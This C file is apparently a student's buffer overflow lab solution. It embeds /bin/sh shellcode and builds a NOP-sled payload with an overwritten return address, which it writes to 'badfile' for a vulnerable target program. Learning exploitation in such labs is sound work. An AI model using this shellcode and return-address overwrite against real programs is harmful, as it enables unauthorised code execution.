/* exploit.c */
/* a program that creates a file containing code for launching shell */
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

/*
    The shellcode is to abtain a shell (/bin/sh) in the target process space.
    You can test it by ((void (*)())shellcode)().
    seed exploit.c shellcode
*/
char shellcode[] =
    "\x31\xc0"                  /* xor      %eax, %eax      */
    "\x50"                      /* pushl    %eax            */
    "\x68""//sh"                /* pushl    $0x68732f2f     */
    "\x68""/bin"                /* pushl    $0x6e69622f     */
    "\x89\xe3"                  /* movl     %esp, %ebx      */
    "\x50"                      /* pushl    %eax            */
    "\x53"                      /* pushl    %ebx            */
    "\x89\xe1"                  /* movl     %esp, %ecx      */
    "\x99"                      /* cltd                     */
    "\xb0\x0b"                  /* movb     0x0b, %al       */
    "\xcd\x80"                  /* int      $0x80           */
;

#define BUF_LEN 256
#define TARGET_LEN  128

#define TARGET_ADDR 0xbffff0f4
#define OFFSET  (0x18)

int main(int argc, char **argv)
{
    /* TODO */
    int i;
    char buffer[BUF_LEN];
    FILE *badfile;
    unsigned long *ps, shcode_start;

    /* shellcode test

    ((void (*)())shellcode)();

    */
    /* initialize buffer with 0x90(NOP instruction) */
    memset(buffer, 0x90, BUF_LEN);


    /****************** build shellcode **************************/
    /*  [ NOP NOP ... NOP shellcode address address ... address ]*/
    strcpy((buffer + TARGET_LEN - strlen(shellcode) - 1), shellcode);
    memset(buffer+strlen(buffer), 0x90, 1);

    ps = (unsigned long *)(buffer + OFFSET);

    /*
     * when i run this program in gdb environment, i don't need the offset 0x70,
     * the program reach the right place i want. But when i run the target
     * program in the shell environment, the TARGET_ADDR is higher 0x50 bytes
     * than in the gdb mode. i don't get the reason, so i add this off set in
     * the source code. i will find the reason later.
     */
    (*ps) = (unsigned long)(TARGET_ADDR + 0x70);

    buffer[BUF_LEN - 1] = '\0';

    /* save the contents to the file "badfile" */
    badfile = fopen("./badfile", "w");
    if(badfile == NULL){
        fprintf(stderr, "file open error!");
        exit(EXIT_FAILURE);
    }
    fwrite(buffer, BUF_LEN, 1, badfile);
    fclose(badfile);

    return 0;
}

